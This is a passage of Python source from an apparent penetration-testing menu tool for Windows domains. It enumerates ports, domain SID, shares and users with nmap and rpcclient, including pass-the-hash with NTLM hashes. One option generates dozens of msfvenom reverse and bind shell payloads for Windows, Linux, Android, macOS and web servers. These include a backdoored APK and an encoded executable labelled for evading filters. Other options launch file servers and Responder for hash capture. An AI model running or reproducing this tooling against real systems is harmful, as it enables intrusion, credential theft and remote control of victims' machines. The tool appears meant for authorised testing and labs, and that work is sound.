COL2 = 44                               # MAX LEN SHARE NAME
COL3 = 23                               # MAX LEN USER NAME
COL4 = 32                               # MAX LEN NTLM HASH
COL5 = 1                                # MAX LEN TOKEN VALUE

SHAR = [" "*COL2]*maxUser		# SHARE NAMES
USER = [" "*COL3]*maxUser		# USER NAMES
HASH = [" "*COL4]*maxUser		# NTLM HASH
VALD = ["0"*COL5]*maxUser		# USER TOKENS

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()

command("echo " + col[1]  + " | base64 -d >  ascii.tmp")
command("echo " + col[2]  + " | base64 -d >> ascii.tmp")
command("echo " + col[3]  + " | base64 -d >> ascii.tmp")
command("echo " + col[4]  + " | base64 -d >> ascii.tmp")
command("echo " + col[5]  + " | base64 -d >> ascii.tmp")
command("echo " + col[6]  + " | base64 -d >> ascii.tmp")
command("echo " + col[7]  + " | base64 -d >> ascii.tmp")
command("echo " + col[8]  + " | base64 -d >> ascii.tmp")
command("echo " + col[9]  + " | base64 -d >> ascii.tmp")
command("echo " + col[10] + " | base64 -d >> ascii.tmp")
command("echo " + col[11] + " | base64 -d >> ascii.tmp")
command("echo " + col[12] + " | base64 -d >> ascii.tmp")

COM = linecache.getline("ascii.tmp", 1).rstrip("\n")
DNS = linecache.getline("ascii.tmp", 2).rstrip("\n")
TIP = linecache.getline("ascii.tmp", 3).rstrip("\n")
PTS = linecache.getline("ascii.tmp", 4).rstrip("\n")
WEB = linecache.getline("ascii.tmp", 5).rstrip("\n")
USR = linecache.getline("ascii.tmp", 6).rstrip("\n")
PAS = linecache.getline("ascii.tmp", 7).rstrip("\n")
NTM = linecache.getline("ascii.tmp", 8).rstrip("\n")
TGT = linecache.getline("ascii.tmp", 9).rstrip("\n")
DOM = linecache.getline("ascii.tmp", 10).rstrip("\n")
SID = linecache.getline("ascii.tmp", 11).rstrip("\n")
TSH = linecache.getline("ascii.tmp", 12).rstrip("\n")

if USR.rstrip(" ") == "":
   USR = "\'\'"   
if PAS.rstrip(" ") == '':
   PAS = "\'\'"
POR = PTS

COM = spacePadding(COM, COL0)
DNS = spacePadding(DNS, COL1)
TIP = spacePadding(TIP, COL1)
POR = spacePadding(POR, COL1)
WEB = spacePadding(WEB, COL1)
USR = spacePadding(USR, COL1)
PAS = spacePadding(PAS, COL1)
NTM = spacePadding(NTM, COL1)
TGT = spacePadding(TGT, COL1)
DOM = spacePadding(DOM, COL1)
SID = spacePadding(SID, COL1)
TSH = spacePadding(TSH, COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check other files for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
   for x in range(0, maxUser):
      USER[x] = read1.readline()
      HASH[x] = read2.readline()
      VALD[x] = read3.readline()
      SHAR[x] = read4.readline()      
      SHAR[x] = spacePadding(SHAR[x], COL2)         
      USER[x] = spacePadding(USER[x], COL3)
      HASH[x] = spacePadding(HASH[x], COL4)    
      VALD[x] = spacePadding(VALD[x], COL5)

if DNS[:5] != "EMPTY":
   command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
   DNSC = 1  

if DOM[:5] != "EMPTY":
   command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
   DOMC = 1                 

count = TIP.count(':')
      
if count > 1:
   IP46 = "-6"
else:
   IP46 = "-4"   
   
time.sleep(5)
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   command("rm *.tmp")							# CLEAR GARBAGE
   linecache.clearcache()						# CLEARS CACHES
   checkParams = 0							# RESET'S VALUE
   checkFile = ""							# RESET'S VALUE
   LTM = getTime()							# GET CLOCKTIME
   command("clear")							# CLEARS SCREEN
   display()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Secret option that autofill's PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':  
      checkParams = test_IP()      
      if checkParams != 1:
         if PTS[:5] == "EMPTY":
            print(colored("[*] Attempting to enumerate live ports, please wait as this can take sometime...", colour3))
            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")         
            PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
            POR = spacePadding(PTS, COL1)
            if POR[:1] == "":
               print("[+] Unable to enumerate any port information, good luck!!...")
            else:
               print("[+] Found live ports...\n")
               print(colored(PTS,colour6) + "\n")   
               
         if "3128" in PTS:
            print(colored("[*] Checking squid proxy for hidden ports...", colour3))
            command("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp 2>&1")
            temp = '"'
            command("awk '/" + temp + "/' squid.tmp > ports.tmp")
            command("echo '" + Green + "'")
            command("cat ports.tmp")
            command("echo '" + Reset + "'")                      
         
         checkParams = test_Port("88")
         if checkParams != 1:
            print(colored("[*] Attempting to synchronise time with remote server...", colour3))                        
            command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
            dateTime = linecache.getline("time.tmp", 1).rstrip("\n")      

            if dateTime != "":
               date, time = dateTime.split(" ")
               time = time.rstrip(")")
               print("[+] Synchronised with remote server...")
               command("echo '" + Green + "'")
               command("timedatectl set-time " + date)
               command("date --set=" + time)
               command("echo '" + Reset + "'")
               LTM = time
               SKEW = 1
         else:
            print("[-] Server synchronisation did not occur...")
            checkParams = 0                                     

         if NTM[:5] != "EMPTY": 
            print("[i] Using HASH value as password credential...")
            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
         else:
            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
         
         errorCheck = linecache.getline("lsaquery.tmp", 1)                              
         if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print("[-] Unable to connect to RPC data...")
            checkParams = 1      
            
         if checkParams != 1:
            print(colored("[*] Attempting to enumerate domain name...", colour3))               
            try:
               null,DOM = errorCheck.split(":")
               SID = " "*COL1
            except ValueError:
               DOM = "EMPTY"
    
            DOM = DOM.lstrip(" ")
            DOM = spacePadding(DOM, COL1)                  
            if DOM[:5] == "EMPTY":
               print("[+] Unable to enumerate domain name...")
            else:
               print("[+] Found domain name...\n")
               print(colored(DOM,colour6))                      
    
            if DOMC == 1:
               print("\n[*] Resetting current domain associated host...")
               command("sed -i '$d' /etc/hosts")
               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
            else:
               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("\n[+] Domain " + DOM.rstrip(" ") + " successfully added to /etc/hosts...")
               DOMC = 1                    
               
            print(colored("[*] Attempting to enumerate domain SID...", colour3))                        
            line2 = linecache.getline("lsaquery.tmp", 2)
            try:
                null,SID = line2.split(":") 
            except ValueError:
               SID = "EMPTY"        
            SID = SID.lstrip(" ")          
            SID = spacePadding(SID, COL1)                        
    
            if SID[:5] == "EMPTY":
               print("[+] Unable to enumerate domain SID...")
            else:
               print("[+] Found SID...\n")
               print(colored(SID,colour6) + "\n")        
           
            print(colored("[*] Attempting to enumerate shares...", colour3))                  
            if NTM[:5] != "EMPTY":
                print("[i] Using HASH value as password credential...")
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
            else:
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
            errorCheck = linecache.getline("shares.tmp", 1)
    
            if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
               print("[-] Unable to connect to RPC data...")
            else:
               for x in range(0, maxUser):
                  SHAR[x] = " "*COL2
               command("sed -i -n '/netname: /p' shares.tmp")
               command("sed -i '/^$/d' shares.tmp")
               command("cat shares.tmp | sort > sshares.tmp")                        
               
               count = lineCount("sshares.tmp")               
               
               if count > 0:
                  print("[+] Found shares...\n")
                  with open("sshares.tmp") as read:
                     for x in range(0, count):
                        SHAR[x]  = read.readline()
                        SHAR[x] = SHAR[x].replace(" ","")
                        try:
                           null, SHAR[x] = SHAR[x].split(":")
                        except ValueError:
                           SHAR[x] = "Error..."
                        print(colored(SHAR[x].rstrip("\n"),colour6))
                        SHAR[x] = dotPadding(SHAR[x], COL2)
                     print("")         
            
            print(colored("[*] Attempting to enumerate domain users...", colour3))
            if NTM[:5] != "EMPTY":
               print("[i] Using HASH value as password credential...")
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
            else:
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
            errorCheck = linecache.getline("domusers.tmp", 1)
            if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
               print("[-] Unable to connect to RPC data...")
            else:               
               command("rm " + dataDir + "/usernames.txt")
               command("rm " + dataDir + "/hashes.txt")                   
               command("sort domusers.tmp > sdomusers.tmp")
               command("sed -i '/^$/d' sdomusers.tmp")
               
               count2 = lineCount("sdomusers.tmp") 
               
               if count2 > 0:
                   print ("[+] Found users...\n")
                   with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
                      for x in range(0, count2):
                         line = read.readline()
                         if "user:[Guest]" in line:
                            null,rid = line.split("rid:")
                            rid = rid.replace("[","")
                            rid = rid.replace("]","")
                         try:
                            null1,USER[x],null2 = line.split(":")
                         except ValueError:
                            USER[x] = "Error..."                           
                         USER[x] = USER[x].replace("[","")
                         USER[x] = USER[x].replace("]","")
                         USER[x] = USER[x].replace("rid","")                     
                         if USER[x][:5] != "Error":
                            USER[x] = spacePadding(USER[x], COL3)
                            HASH[x] = spacePadding("", COL4)
                            if USER[x][:1] != " ":
                               write1.write(USER[x].rstrip(" ") + "\n")
                               write2.write(HASH[x].rstrip(" ") + "\n")                                                         
                               print(colored(USER[x],colour6))
               else:
                  print("[+] Unable to enumerate domain users...")   
            
               print(colored("\n[*] Attempting to enumerate Guest password policy...", colour3))
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")
               command("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
               command("sed -i '/^s*$/d' policy.tmp 2>&1")
               command("echo '" + Green + "'")
               command("cat policy.tmp")
               command("echo '" + Reset + "'")               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNS
      DNS = input("[?] Please enter DNS IP address: ")
      
      if DNS == "":
         DNS = BAK
      else:
         DNS = spacePadding(DNS, COL1)
         
         count = DNS.count(':')
       
         if count > 1:
            print("[+] Defualting to IP 6...")
            IP46 = "-6"
         else:
            print("[+] Defaulting to IP 4...")
            IP46 = "-4"
            
         if DNSC == 1:
            print("\n[+] Resetting current DNS IP association...")
            command("sed -i '$d' /etc/resolv.conf")
            DNS = "EMPTY"
            DNS = spacePadding(DNS, COL1)
            DNSC = 0
            
         if DNSC == 0:
            print("[+] Adding DNS IP " + DNS.rstrip(" ") + " to /etc/resolv.conf...")
            command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
            DNSC = 1
    
         COM = checkInterface("DNS", COM)
         prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("[?] Please enter remote IP address: ")
      
      if TIP == "":
         TIP = BAK
      else:
         TIP = spacePadding(TIP, COL1)
                  
         count = TIP.count(':')

         if count > 1:
            print("[+] Defualting to IP 6...")
            IP46 = "-6"
         else:
            print("[+] Defaulting to IP 4...")
            IP46 = "-4"
         
         if DOMC == 1:
            print("[+] Resetting current domain " + BAK.rstrip(" ") + " association...")
            command("sed -i '$d' /etc/hosts")
            DOM = "EMPTY"
            DOM = spacePadding(DOM, COL1)
            DOMC = 0
            
         if DOMC == 0:
            print("[+] Adding domain " + DOM.rstrip(" ") + " to /etc/hosts...")
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            DOMC = 1

         COM = checkInterface("TIP", COM)
         prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      print("[i] Current live port listing: " + PTS)
      BAK = POR
      POR = input("[?] Please enter port numbers: ")
      
      if POR != "":
         PTS = POR
         POR = spacePadding(POR, COL1)
      else:
         POR = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the web address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = WEB
      WEB = input("[?] Please enter the web address: ")
      
      if WEB != "":
         WEB = spacePadding(WEB, COL1)
      else:
         WEB = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = USR
      USR = input("[?] Please enter username: ")
      if USR == "":
         USR = BAK
         
      if USR.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))

      if USR[:2] == '""':
         USR = "''"

      if USR.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         USR = BAK
         
      USR = spacePadding(USR, COL1)
      NTM = "EMPTY"
      
      for x in range(0, maxUser):
         if USER[x].rstrip(" ") == USR.rstrip(" "):
            NTM = HASH[x]
            if NTM[:1] == " ":
               NTM = "EMPTY"
               
      NTM = spacePadding(NTM, COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = PAS
      PAS = input("[?] Please enter password: ")
      
      if PAS == "":
         PAS = BAK
         
      if PAS.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))
         
      if PAS[:2] == '""':
         PAS = "''"
         
      if PAS.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         PAS = BAK
         
      PAS = spacePadding(PAS, COL1)
      NTM = spacePadding("EMPTY", COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = NTM
      NTM = input("[?] Please enter hash value: ")
      
      if NTM != "":
         NTM = spacePadding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the ticket name
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = TGT
      TGT = input("[?] Please enter ticket name: ")
      
      
      if TGT != "":
         TGT = spacePadding(TGT, COL1)
      else:
         TGT = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = DOM
      DOM = input("[?] Please enter domain name: ")
      
      if DOM == "":
         DOM = BAK
      else:
         DOM = spacePadding(DOM, COL1)
         
         if DOMC == 1:
            print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
            command("sed -i '$d' /etc/hosts")
            
         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = SID
      SID = input("[?] Please enter domain SID value: ")
      
      if SID != "":
         SID = spacePadding(SID, COL1)
      else:
         SID = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = TSH
      TSH = input("[?] Please enter share name: ")
      
      if TSH != "":
         TSH = spacePadding(TSH,COL1)
      else:
         TSH = BAK    
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Create locally defined exploit files.
# Details : 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      checkParams = getPort()
      
      if checkParams != 1:
         print(colored("[*] Creating windows exploits...", colour3))         

         command("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")         
         command("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_http_reverse_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_https_reverse_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x64_macro.vba >> arsenal.tmp 2>&1")         
         if TIP[:5] != "EMPTY":
            command("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_shell.exe >> arsenal.tmp 2>&1")
            command("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_hidden_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_normal_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_http_reverse_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_https_reverse_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x86_macro.vba >> arsenal.tmp 2>&1")         
         command("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_bind_shell.exe >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_tcp_allports	 LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_allports_reverse_shell.exe >> arsenal.tmp 2>&1")         
         command("msfvenom -p cmd/windows/reverse_powershell  		 LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/win_powershell.bat >> arsenal.tmp 2>&1")
         
         print(colored("[*] Creating linux exploits...", colour3))
         command("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_shell.elf >> arsenal.tmp 2>&1")
         command("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_shell.elf >> arsenal.tmp 2>&1")
         command("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_http_shell.elf >> arsenal.tmp 2>&1")
         command("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_http_shell.elf >> arsenal.tmp 2>&1")
         command("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_multi_bind_shell.elf >> arsenal.tmp 2>&1")
         command("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_single_bind_shell.elf >> arsenal.tmp 2>&1")
         
         print(colored("[*] Creating android exploits...", colour3))
#        command("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
         command("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_embed_shell.apk >> arsenal.tmp 2>&1")
         command("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_http_shell.apk >> arsenal.tmp 2>&1")
         command("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_https_shell.apk >> arsenal.tmp 2>&1")
         
         print(colored("[*] Creating mac exploits...", colour3))
         command("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_reverse_shell.macho >> arsenal.tmp 2>&1")
         command("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_bind_shell.macho >> arsenal.tmp 2>&1")
         
         print(colored("[*] Creating other exploits...", colour3))
         command("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/web_reverse_shell.php >> arsenal.tmp 2>&1")
         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/java_reverse_shell.jsp >> arsenal.tmp 2>&1")
         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/asp_reverse_shell.asp >> arsenal.tmp 2>&1")
         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/war_reverse_shell.war >> arsenal.tmp 2>&1")
         command("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/bash_reverse_shell.sh >> arsenal.tmp 2>&1")
         command("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/python_reverse_shell.py >> arsenal.tmp 2>&1")
         command("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/perl_reverse_shell.pl >> arsenal.tmp 2>&1")
         
         # ANTI WAF ----         
         command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/win_encoded_shell.exe >> arsenal.tmp 2>&1")

         command("chmod +X *.*")            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Start HTTP server.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      HTTP = getPort()
      
      if HTTP != 1:
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
         banner("HTTP SERVER") 
         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
         command("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
         command("xdotool key Ctrl+Tab")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Start SMB server.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      command("xdotool key Ctrl+Shift+T")
      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
      banner("SMB SERVER") 
      command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
      command("xdotool type 'impacket-smbserver " + httpDir + " ./" + httpDir + " -smb2support'; xdotool key Return")
      command("xdotool key Ctrl+Tab")
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Start Responder
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      command("xdotool key Ctrl+Shift+T")
      command("xdotool key Alt+Shift+S; xdotool type 'RESPONDER'; xdotool key Return")
      banner("RESPONDER") 
      command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
      command("xdotool type 'responder -I " + netWork + " -v'; xdotool key Return")
      command("xdotool key Ctrl+Tab")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - whois 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      checkParams = test_DNS()         
      if checkParams != 1:
         print(colored("[*] Checking DNS Server...\n", colour3))         
         command("whois -I "  + DNS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dig authority DNS +noedms
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      checkParams = test_DNS()
      if checkParams != 1:
         checkParams = test_Domain()
                  
      if checkParams != 1:
         print(colored("[*] Checking DNS Server...", colour3))
         command("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
      prompt()  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dnsenum
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='18':
      checkParams = test_Domain()
      
      if checkParams != 1:
         print(colored("[*] Checking DOMAIN Server...", colour3))
         command("dnsenum " + DOM.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
